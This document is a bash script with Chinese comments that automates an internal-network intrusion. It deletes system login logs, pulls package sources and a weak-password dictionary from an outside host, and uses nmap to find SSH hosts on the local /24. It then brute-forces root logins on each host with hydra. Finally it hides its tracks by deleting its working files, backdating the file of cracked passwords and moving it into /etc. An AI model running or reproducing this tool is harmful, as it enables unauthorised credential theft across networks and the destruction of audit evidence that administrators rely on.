#!/bin/bash
# Author:Tremb1e

# 显示本机IP，使用CIDR显示内网范围
local_ip=`ifconfig ens33|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
local_netmask=`ifconfig ens33|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $4}'|tr -d "addr:"`
echo 本机IP为：$local_ip
echo 内网子网掩码为：$local_netmask

# 输出扫描范围
ip_range=${local_ip%.*}.0/24
echo 扫描范围：$ip_range

# 检测linux版本，根据不同版本下载不同的源
id=$(awk -F= '$1=="ID" { print $2 ;}' /etc/os-release)
if [ $id = "ubuntu" ] ;then
echo 本机为$id
echo 清理登录痕迹
sudo rm /var/log/auth.log
echo 开始备份源文件
sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak
sudo touch /etc/apt/sources.list
echo 开始下载准备好的源文件
sudo curl https://www.macrz.com/sources.list>>/etc/apt/sources.list
echo 开始安装nmap和hydra
sudo apt update &&sudo apt install nmap hydra -y

sudo mv /etc/apt/sources.list.bak /etc/apt/sources.list
echo 源文件已恢复

# 适配centos
elif [ $id = "\"centos\"" ] ;then
echo 本机为$id
echo 清理登录痕迹
sudo rm /var/log/secure
echo 开始备份源文件
sudo mkdir /etc/yum.repos.d/backup
sudo mv /etc/yum.repos.d/* /etc/yum.repos.d/backup
sudo cd /etc/yum.repos.d/
sudo touch CentOS-Base.repo CentOS-CR.repo CentOS-Debuginfo.repo CentOS-fasttrack.repo CentOS-Media.repo CentOS-Sources.repo CentOS-Vault.repo CentOS-x86_64-kernel.repo
echo 开始下载准备好的源文件
sudo curl https://www.macrz.com/CentOS-Base.repo >> CentOS-Base.repo
sudo curl https://www.macrz.com/CentOS-CR.repo >> CentOS-CR.repo
sudo curl https://www.macrz.com/CentOS-Debuginfo.repo >> CentOS-Debuginfo.repo
sudo curl https://www.macrz.com/CentOS-fasttrack.repo >> CentOS-fasttrack.repo
sudo curl https://www.macrz.com/CentOS-Media.repo >> CentOS-Media.repo
sudo curl https://www.macrz.com/CentOS-Sources.repo >> CentOS-Sources.repo
sudo curl https://www.macrz.com/CentOS-Vault.repo >> CentOS-Vault.repo
sudo curl https://www.macrz.com/CentOS-x86_64-kernel.repo >> CentOS-x86_64-kernel.repo
echo 开始安装nmap和hydra
sudo yum clean all && yum makecache &&sudo yum install nmap hydra -y

sudo rm /etc/yum.repos.d/*
sudo mv /etc/yum.repos.d/backup /etc/yum.repos.d
echo 源文件已恢复
fi

# 还可以适配其他发行版或架构



# 先使用nmap进行内网主机的探测
echo "开始扫描存活主机"

# 利用管道提取出开放22端口的IP地址到ip.txt文件中
sudo nmap -vv -n -p22 $ip_range | grep "Discovered open port" | awk {'print $6'} > ./ip.txt

# 从ip.txt文件中读取存活主机
echo -e "\n"
echo 存活主机IP：
while read line
do
    echo $line
done < ./ip.txt
echo -e "\n"

# 下载生成的弱口令字典
echo 开始下载弱口令字典
curl https://www.macrz.com/password.txt >> password.txt

# 使用hydra爆破启用ssh服务的IP
cat ./ip.txt | while read line
do 
    echo "Current IP: ${line}"
    hydra -l root -P ./password.txt -t 6 -vV $line ssh | grep "host:" >> pass_tools.txt
    echo -e "\n"
done

# 清理痕迹 
echo 开始清理痕迹
sudo rm ip.txt password.txt /etc/apt/sources.list
echo 生成文件已删除

sudo touch -r /etc/hosts pass_tools.txt
sudo mv pass_tools.txt /etc
echo 密码文件时间已修改，已转移文件夹
